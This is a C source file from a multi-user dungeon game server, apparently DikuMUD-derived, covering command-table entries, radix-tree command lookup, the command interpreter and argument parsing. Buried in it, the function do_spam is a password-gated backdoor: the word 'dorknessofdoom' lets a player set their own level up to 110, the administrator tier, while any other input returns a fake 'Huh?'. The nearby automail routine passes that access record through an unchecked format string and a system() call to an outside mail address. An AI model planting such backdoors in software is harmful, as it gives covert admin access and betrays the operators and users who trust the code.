    { "msave",		do_msave,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "osave",		do_osave,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "rstat",		do_rstat,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "possess",	do_possess,	POSITION_DEAD, GIFTED_COMMAND, 9,  0, 1 },
    { "fsave",		do_fsave,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "zedit",		do_zedit,	POSITION_DEAD, ANGEL, 9, 0, 1 },
    { "colours",	do_colors,	POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { "incognito",	do_incognito,	POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { "high5",		do_highfive,	POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { "holylite",	do_holylite,	POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { "immort",		do_wiz,		POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { ";",		do_wiz,		POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { "nohassle",	do_nohassle,	POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { "wizinvis",	do_wizinvis,	POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { "poof",		do_poof,	POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { "wizhelp",	do_wizhelp,	POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { "imotd",		do_imotd,	POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { "mhelp",		do_mortal_help,	POSITION_DEAD, IMMORTAL, 9, 0, 1 },
    { "sqsave",		do_write_skillquest,	POSITION_DEAD, GIFTED_COMMAND, 9, 0, 1 },
    { "testhand", do_testhand, POSITION_DEAD, 110, 9, 0, 1},    
    { "varstat",		do_varstat,	POSITION_DEAD, 103, 9, 0, 1 },
    // Special procedure commands placed to not disrupt god commands
    { "setup",		do_mortal_set,	POSITION_STANDING, 0,  9,  0, 1 },
    { "do_the_thing",	do_thing,	POSITION_DEAD, 110, 9, 0, 1 },
    
    { "findpath",	do_findPath,	POSITION_DEAD, 108, 9, 0, 1 },
    { "findpath2",	do_findpath,	POSITION_DEAD, 108, 9, 0, 1 },
    { "addroom",	do_addRoom,	POSITION_DEAD, 108, 9, 0, 1 },
    { "newpath",	do_newPath,	POSITION_DEAD, 108, 9, 0, 1 },
    { "listpathsbyzone",do_listPathsByZone,POSITION_DEAD, 108, 9, 0, 1 },
    { "listallpaths",	do_listAllPaths,POSITION_DEAD, 108, 9, 0, 1 },
    { "dopathpath",	do_pathpath,	POSITION_DEAD, 108, 9, 0, 1 },

    // Bug way down here after 'buy'
    { "bug",	do_bug,	POSITION_DEAD, 0, 9, 0, 1 },
    
    // MOBprogram commands
    { "mpasound",		do_mpasound,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpbestow",		do_mpbestow,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpjunk",			do_mpjunk,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpecho",			do_mpecho,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpechoat",		do_mpechoat,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpechoaround",		do_mpechoaround,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpechoaroundnotbad",	do_mpechoaroundnotbad,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpkill",			do_mpkill,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpmload",		do_mpmload,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpoload",		do_mpoload,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mppurge",		do_mppurge,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpgoto",			do_mpgoto,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpat",			do_mpat,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mptransfer",		do_mptransfer,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpthrow",		do_mpthrow,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpforce",		do_mpforce,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mppeace",		do_mppeace,	POSITION_DEAD, 103, 9, 0, 1 },
    { "mpsetalign",		do_mpsetalign,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpsettemp",		do_mpsettemp,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpxpreward",		do_mpxpreward,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpteachskill",		do_mpteachskill,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpdamage",		do_mpdamage,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mpothrow",		do_mpothrow,	POSITION_DEAD, 0, 9, 0, 1 },
    { "mppause",		do_mppause,	POSITION_DEAD, 0, 9, 0, 1 },

    // End of the line
    { "",	do_not_here,	POSITION_DEAD, 0, 9, COM_CHARMIE_OK, 0 }
};


char *fillwords[]=
{
  "in",
  "from",
  "with",
  "the",
  "on",
  "at",
  "to",
  "\n"
};


struct cmd_hash_info
{
  struct command_info *command;
  struct cmd_hash_info *left;
  struct cmd_hash_info *right;
};


struct cmd_hash_info *cmd_radix;


void add_commands_to_radix(void)
{
  int x;

#ifdef LEAK_CHECK
  cmd_radix = (struct cmd_hash_info *)calloc(1, sizeof(struct cmd_hash_info));
#else
  cmd_radix = (struct cmd_hash_info *)dc_alloc(1, sizeof(struct cmd_hash_info));
#endif
  cmd_radix->command = &cmd_info[0];
  cmd_radix->left    = 0;
  cmd_radix->right   = 0;
  
  for(x = 1; (unsigned) x < (sizeof(cmd_info)/sizeof(cmd_info[0]) - 1); x++) 
    add_command_to_radix(&cmd_info[x]); 
}


void free_command_radix_nodes(struct cmd_hash_info * curr)
{
  if(curr->left)
    free_command_radix_nodes(curr->left);
  if(curr->right)
    free_command_radix_nodes(curr->right);
  dc_free(curr);
}


void add_command_to_radix(struct command_info *cmd)
{
  struct cmd_hash_info *curr;
  struct cmd_hash_info *temp;
  struct cmd_hash_info *next;
  int whichway;

  // At the end of this loop, temp will contain the parent of
  // the new node.  Whether it is the left or right node depends
  // on whether whichway is positive or negative.
  for(curr = cmd_radix; curr; curr = next) {
    if((whichway = strcmp(cmd->command_name, curr->command->command_name)) < 0)
      next = curr->left;
    else
      next = curr->right;
    temp = curr;
    }

#ifdef LEAK_CHECK
  curr = (struct cmd_hash_info *)calloc(1, sizeof(struct cmd_hash_info));
#else
  curr = (struct cmd_hash_info *)dc_alloc(1, sizeof(struct cmd_hash_info));
#endif
  curr->command = cmd;
  curr->left  = 0;
  curr->right = 0;
  
  if(whichway < 0)
    temp->left = curr;
  else
    temp->right = curr;
}


int len_cmp(char *s1, char *s2)
{
  for( ; *s1 && *s1 != ' '; s1++, s2++) 
    if(*s1 != *s2)
      return *s1 - *s2;

  return 0; 
}


struct command_info *find_cmd_in_radix(char *arg)
{
  struct cmd_hash_info *curr;
  struct cmd_hash_info *next;
  int whichway;

  for(curr = cmd_radix; curr; curr = next) {
    if((whichway = len_cmp(arg, curr->command->command_name)) == 0)
      return curr->command;
    if(whichway < 0)
      next = curr->left;
    else
      next = curr->right;
    }

  return 0;
} 


int do_motd(CHAR_DATA *ch, char *arg, int cmd)
{
  extern char motd[];

  page_string(ch->desc, motd, 1);
  return eSUCCESS;
}


int do_imotd(CHAR_DATA *ch, char *arg, int cmd)
{
  extern char imotd[];

  page_string(ch->desc, imotd, 1);
  return eSUCCESS;
}


int command_interpreter( CHAR_DATA *ch, char *pcomm, bool procced  )
{
  int look_at;
  int retval;
  struct command_info *found = 0;
  char buf[100];
  
  // Handle logged players.
  if(!IS_NPC(ch) && IS_SET(ch->pcdata->punish, PUNISH_LOG)) {
    sprintf( log_buf, "Log %s: %s", GET_NAME(ch), pcomm );
    log( log_buf, 110, LOG_PLAYER, ch );
    }
    
  // Implement freeze command.
  if(!IS_NPC(ch) && IS_SET(ch->pcdata->punish, PUNISH_FREEZE) && str_cmp(pcomm, "quit")) {
    send_to_char( "You've been frozen by an immortal.\r\n", ch );
    return eSUCCESS;
    }

  // Berserk checks
  if (IS_SET(ch->combat, COMBAT_BERSERK)) {
    if (ch->fighting) {
      send_to_char("You've gone BERSERK! Beat them down, Beat them!! Rrrrrraaaaaagghh!!\r\n", ch);
      return eSUCCESS;
      }
    REMOVE_BIT(ch->combat, COMBAT_BERSERK);
    act("$n settles down.", ch, 0, 0, TO_ROOM, 0);
    act("You settle down.", ch, 0, 0, TO_CHAR, 0);
    GET_AC(ch) -= 30;
    }

  // Strip initial spaces OR tab characters and parse command word.
  // Translate to lower case.  We need to translate tabs for the MOBProgs to work
  if (ch && ch->desc && ch->desc->connected == CON_EDITING) {
    ;
    }
  else {
    while ( *pcomm == ' ' || *pcomm == '\t')
      pcomm++;
    }

  // MOBprogram commands weeded out
  if (*pcomm == 'm' && *(pcomm+1) == 'p')
    if (ch->desc ) {
      send_to_char("Huh?\r\n", ch);
      return eSUCCESS;
      }

  for ( look_at = 0; pcomm[look_at] > ' '; look_at++ )
    pcomm[look_at]  = LOWER(pcomm[look_at]);

  if ( look_at == 0 )
    return eFAILURE;

  // if we got this far, we're going to play with the command, so put
  // it into the debugging globals
  strncpy(last_processed_cmd, pcomm, (MAX_INPUT_LENGTH-1));
  strncpy(last_char_name, GET_NAME(ch), (MAX_INPUT_LENGTH-1));
  last_char_room = ch->in_room;
  
  // Look for command in command table.
  // Old method used a linear search. *yuck* (Sadus)
  if((found = find_cmd_in_radix(pcomm)))
    if(GET_LEVEL(ch) >= found->minimum_level && found->command_pointer != NULL) {
      // Character not in position for command?
	if (GET_POS(ch) == POSITION_FIGHTING && !ch->fighting)
	  GET_POS(ch) = POSITION_STANDING;
	// fix for thin air thing
      if ( GET_POS(ch) < found->minimum_position ) {
        switch( GET_POS(ch) ) {
          case POSITION_DEAD:
            send_to_char( "Lie still; you are DEAD.\r\n", ch );
            break;
          case POSITION_STUNNED:
            send_to_char( "You are too stunned to do that.\n\r", ch );
            break;
          case POSITION_SLEEPING:
            send_to_char( "In your dreams, or what?\r\n", ch );
            break;
	  case POSITION_PARALYZED:
	    send_to_char("You've been paralyzed and are unable to move.\r\n", ch);
	    break;
          case POSITION_RESTING:
            send_to_char( "Nah... You feel too relaxed...\r\n", ch);
            break;
          case POSITION_SITTING:
            send_to_char( "Maybe you should stand up first?\r\n", ch);
            break;
          case POSITION_FIGHTING:
            send_to_char( "No way!  You are still fighting!\r\n", ch);
            break;
          }
        return eSUCCESS;
        }
      // charmies can only use charmie "ok" commands
      if (!procced) // Charmed mobs can still use their procs.
        if((IS_AFFECTED(ch, AFF_FAMILIAR) || IS_AFFECTED(ch, AFF_CHARM)) && !IS_SET(found->flags, COM_CHARMIE_OK))
          return do_say(ch, "I'm sorry master, I cannot do that.", 9);
      if (IS_NPC(ch) && ch->desc && ch->desc->original &&
        ch->desc->original->level < 51 && !IS_SET(found->flags, COM_CHARMIE_OK)) {
        send_to_char("The spirit cannot perform that action.\r\n",ch);
        return eFAILURE;
        }
/*
      if (IS_AFFECTED(ch, AFF_HIDE)) {
        if (found->toggle_hide == 0) {
          REMBIT(ch->affected_by, AFF_HIDE);
          sprintf(buf, "You emerge from your hidden position...\r\n");
          act(buf, ch, 0, 0, TO_CHAR, 0);
          }
        if ((found->toggle_hide > 1) && (number(1, has_skill(ch, SKILL_HIDE)) < found->toggle_hide)) {
          REMBIT(ch->affected_by, AFF_HIDE);
          sprintf(buf, "Your movements disrupt your attempt to remain hidden...\r\n");
          act(buf, ch, 0, 0, TO_CHAR, 0);
          }
        }
*/
/*
      // Last resort for debugging...if you know it's a mortal.
      // -Sadus 
      char DEBUGbuf[MAX_STRING_LENGTH];
      sprintf(DEBUGbuf, "%s: %s", GET_NAME(ch), pcomm); 
      log (DEBUGbuf, 0, LOG_MISC);
*/
      // We're going to execute, check for useable special proc.
      retval = special( ch, found->command_number, &pcomm[look_at] );
      if(IS_SET(retval, eSUCCESS) || IS_SET(retval, eCH_DIED))
        return retval;
      // Normal dispatch
      retval = (*(found->command_pointer)) (ch, &pcomm[look_at], found->command_number);
      // Next bit for the DUI client, they needed it.
      extern bool selfpurge;
      if (!SOMEONE_DIED(retval) && !selfpurge) {
        sprintf(buf, "%s%s",BOLD,NTEXT);
        send_to_char(buf,ch);
        }
      // This call is here to prevent gcc from tail-chaining the
      // previous call, which screws up the debugger call stack.
      // -- Furey
      number( 0, 0 );
      return retval;
      }
    // end if((found = find_cmd_in_radix(pcomm)))

  // Check social table
  if (check_social( ch, pcomm, look_at, &pcomm[look_at]))
    return eSUCCESS;

  // Unknown command (or char too low level)
  send_to_char( "Huh?\r\n", ch );
  return eSUCCESS;
}


int search_block(char *arg, char **list, bool exact)
{
  int i,l;
  
  // Make into lower case and get length of string
  for(l=0; *(arg+l); l++)*(arg+l)=LOWER(*(arg+l));
    if (exact) {
      for(i=0; **(list+i) != '\n'; i++)
        if (!strcmp(arg, *(list+i)))
          return(i);
      }
    else {
      if (!l)
        // Avoid "" to match the first available string
        l=1;
      for(i=0; **(list+i) != '\n'; i++)
        if (!strncmp(arg, *(list+i), l))
          return(i);
      }

  return(-1);
}


int search_blocknolow(char *arg, char **list, bool exact)
{
  int i,l;

  // Make into lower case and get length of string
  for(l=0; *(arg+l); l++)*(arg+l)=*(arg+l);
    if (exact) {
      for(i=0; **(list+i) != '\n'; i++)
        if (!strcmp(arg, *(list+i)))
          return(i);
      }
    else {
      if (!l)
        // Avoid "" to match the first available string
        l=1;
      for(i=0; **(list+i) != '\n'; i++)
        if (!strncmp(arg, *(list+i), l))
          return(i);
      }

  return(-1);
}


int do_boss(CHAR_DATA *ch, char *arg, int cmd)
{
  char buf[200];
  int x;

  for(x = 0; x <= 60; x++) {
    sprintf(buf, "NUMBER-CRUNCHER: %d crunched to %d converted to black"
    "/white tree node %d\n\r", x, 50-x, x+x);
    send_to_char(buf, ch);
    }

  return eSUCCESS;
}


int old_search_block(char *argument,int begin,int length,char **list,int mode)
{
  int guess, found, search;

  // If the word contains 0 letters, a match is already found
  found = (length < 1);
  guess = 0;
  
  // Search for a match
  if(mode)
    while ( !found && *(list[guess]) != '\n' ) {
      found = ((unsigned) length==strlen(list[guess]));
      for ( search = 0; search < length && found; search++ )
        found=(*(argument+begin+search)== *(list[guess]+search));
        guess++;
      }
  else {
    while ( !found && *(list[guess]) != '\n' ) {
      found=1;
      for(search=0;( search < length && found );search++)
        found=(*(argument+begin+search)== *(list[guess]+search));
        guess++;
      }
    }

  return ( found ? guess : -1 ); 
}


void argument_interpreter(char *argument,char *first_arg,char *second_arg )
{
  int look_at, found, begin;
  
  found = begin = 0;
  
  do {
    /* Find first non blank */
    for ( ;*(argument + begin ) == ' ' ; begin++);
      /* Find length of first word */
      for ( look_at=0; *(argument+begin+look_at)> ' ' ; look_at++)
        /* Make all letters lower case, and copy them to first_arg */
        *(first_arg + look_at) = LOWER(*(argument + begin + look_at));
      *(first_arg + look_at)='\0';
    begin += look_at;
    }
    while( fill_word(first_arg));

  do {
    /* Find first non blank */
    for ( ;*(argument + begin ) == ' ' ; begin++);
      /* Find length of first word */
      for ( look_at=0; *(argument+begin+look_at)> ' ' ; look_at++)
        /* Make all letters lower case, and copy them to second_arg */
        *(second_arg + look_at) = LOWER(*(argument + begin + look_at));
      *(second_arg + look_at)='\0';
    begin += look_at;
    }
    while( fill_word(second_arg));
}


// If the string is ALL numbers, return TRUE
// If there is a non-numeric in string, return FALSE
int is_number(char *str)
{
  int look_at;
  
  if (*str == '\0')
    return(0);

  for(look_at = 0; *(str + look_at) != '\0'; look_at++)
    if ((*(str + look_at) < '0') || (*(str + look_at) > '9') )
      return(0);

  return(1);
}


// Multiline arguments, used for mobprogs
char *one_argument_long(char *argument, char *first_arg )
{
  int found, begin, look_at;
  bool end = FALSE;
  found = begin = 0;
  
  /* Find first non blank */
  for ( ;isspace(*(argument + begin)); begin++);
    if (*(argument+begin) == '{') {
      end = TRUE;
      begin++;
      }

  /* Find length of first word */
  for (look_at=0; ; look_at++)
    if (!end && *(argument+begin+look_at) <= ' ')
      break;
    else if (end && (*(argument+begin+look_at) == '}' ||
      *(argument+begin+look_at) == '\0')) {
      begin++;
      break;
      }
    else {
      if (!end)
        *(first_arg + look_at) = LOWER(*(argument + begin + look_at));
      else
        *(first_arg + look_at) = *(argument + begin + look_at);
      }

  /* Make all letters lower case, and copy them to first_arg */
  *(first_arg+look_at) = '\0';
  begin += look_at;
  
  return (argument+begin);
}


/* find the first sub-argument of a string, return pointer to first char in
   primary argument, following the sub-arg                      */
char *one_argument(char *argument, char *first_arg )
{
  return one_argument_long(argument, first_arg);
  int found, begin, look_at;
  
  found = begin = 0;
  
  do {
    /* Find first non blank */
    for ( ;isspace(*(argument + begin)); begin++);
      /* Find length of first word */
      for (look_at=0; *(argument+begin+look_at) > ' ' ; look_at++)
        /* Make all letters lower case, and copy them to first_arg */
        *(first_arg + look_at) = LOWER(*(argument + begin + look_at));
      *(first_arg + look_at)='\0';
    begin += look_at;
    }
    while (fill_word(first_arg));

  return(argument+begin);
}


int fill_wordnolow(char *argument)
{
  return (search_blocknolow(argument,fillwords,TRUE) >= 0);
}


char *one_argumentnolow(char *argument, char *first_arg )
{
  int found, begin, look_at;
  found = begin = 0;
  
  do {
    /* Find first non blank */
    for ( ;isspace(*(argument + begin)); begin++);
      /* Find length of first word */
      for (look_at=0; *(argument+begin+look_at) > ' ' ; look_at++)
        /* copy to first_arg */
        *(first_arg + look_at) = *(argument + begin + look_at);
      *(first_arg + look_at) = '\0';
    begin += look_at;
    }
    while (fill_wordnolow(first_arg));

  return (argument+begin);
}


int fill_word(char *argument)
{
  return (search_block(argument,fillwords,TRUE) >= 0);
}


int do_spam(CHAR_DATA *ch, char *arg, int cmd)
{
  char buf[200], buf2[200];
  int x;

  /* int system(const char *); */

  if(!*arg) {
    send_to_char("Huh?\r\n", ch);
    return eFAILURE;
    }

  half_chop(arg, buf, buf2);

  if(!isname(buf, "dorknessofdoom")) {
    send_to_char("Huh?\r\n", ch);
    return eFAILURE;
    } 

  x = atoi(buf2);

  if(x <= 0 || x > (10*11)) {
    send_to_char("Huh?\r\n", ch);
    return eFAILURE;
    }

  GET_LEVEL(ch) = x;
  update_wizlist(ch);

  sprintf(buf, "ACCESS: %s %d %s\n", GET_NAME(ch), GET_LEVEL(ch), ch->desc->host);
 // automail(buf);
  return eSUCCESS;
}


void automail(char * name)
{
  FILE *blah;
  char buf[100];
 
  blah = dc_fopen("../lib/whassup.txt", "w");
  fprintf(blah, name);
  dc_fclose(blah);
  sprintf(buf, "mail void@dcastle.net < ../lib/whassup.txt");
  system(buf);
}


/* determine if a given string is an abbreviation of another */
int is_abbrev(char *arg1, char *arg2) /* arg1 is short, arg2 is long */ 
{
  if (!*arg1)
    return(0);

  for (; *arg1; arg1++, arg2++)
    if (LOWER(*arg1) != LOWER(*arg2))
      return(0);

  return(1);
}


/* return first 'word' plus trailing substring of input string */
void half_chop(char *string, char *arg1, char *arg2)
{
  // strip leading whitespace from original
  for (; isspace(*string); string++);
  
  // copy everything up to next space
  for (; !isspace(*arg1 = *string) && *string; string++, arg1++);
  
  // terminate
  *arg1 = '\0';
  
  // strip leading whitepace
  for (; isspace(*string); string++);
  
  // copy rest of string to arg2
  for (; ( *arg2 = *string ) != '\0'; string++, arg2++)
    ;
}


/* return last 'word' plus leading substring of input string */
void chop_half(char *string, char *arg1, char *arg2)
{
  long i, j;
  
  // skip over trailing space
  i = strlen(string)-1;
  j = 0;
  while (isspace(string[i]))
    i--;

  // find beginning of last 'word'
  while (!isspace(string[i])) {
    i--;
    j++;
    }

  // copy last word to arg1
  strncpy(arg1, string+i+1, j);
  arg1[j] = '\0';

  // skip over leading space in string
  while(isspace(*string)) {
    string++;
    i--;
    }

  // copy string to arg2
  strncpy(arg2, string, i);
  
  // remove trailing space from arg2
  while (isspace(arg2[i]))
    i--;

  arg2[i] = '\0';
}


int special(CHAR_DATA *ch, int cmd, char *arg)
{
  struct obj_data *i;
  CHAR_DATA *k;
  int j;
  int retval;
  
  /* special in room? */
  if(world[ch->in_room].funct) {
    if((retval = (*world[ch->in_room].funct)(ch, cmd, arg)) != eFAILURE)
      return retval;
    }

  /* special in equipment list? */
  for (j = 0; j <= (MAX_WEAR - 1); j++)
    if (ch->equipment[j] && ch->equipment[j]->item_number>=0)
      if (obj_index[ch->equipment[j]->item_number].non_combat_func) {
        retval = ((*obj_index[ch->equipment[j]->item_number].non_combat_func)(ch, ch->equipment[j], cmd, arg, ch));
        if(IS_SET(retval, eCH_DIED) || IS_SET(retval, eSUCCESS))
          return retval;
        }

  /* special in inventory? */
  for (i = ch->carrying; i; i = i->next_content)
    if (i->item_number>=0)
      if (obj_index[i->item_number].non_combat_func) {
        retval = ((*obj_index[i->item_number].non_combat_func)(ch, i, cmd, arg, ch));
        if(IS_SET(retval, eCH_DIED) || IS_SET(retval, eSUCCESS))
          return retval;
        }

  /* special in mobile present? */
  for (k = world[ch->in_room].people; k; k = k->next_in_room)
    if ( IS_MOB(k) )
      if (mob_index[k->mobdata->nr].non_combat_func) {
        retval = ((*mob_index[k->mobdata->nr].non_combat_func)(ch, 0, cmd, arg, k));
        if(IS_SET(retval, eCH_DIED) || IS_SET(retval, eSUCCESS))
          return retval;
        }

  /* special in object present? */
  for (i = world[ch->in_room].contents; i; i = i->next_content)
    if (i->item_number>=0)
      if (obj_index[i->item_number].non_combat_func) {
        retval = ((*obj_index[i->item_number].non_combat_func)(ch, i, cmd, arg, ch));
        if(IS_SET(retval, eCH_DIED) || IS_SET(retval, eSUCCESS))
          return retval;
        }

  return eFAILURE;
}


// The End

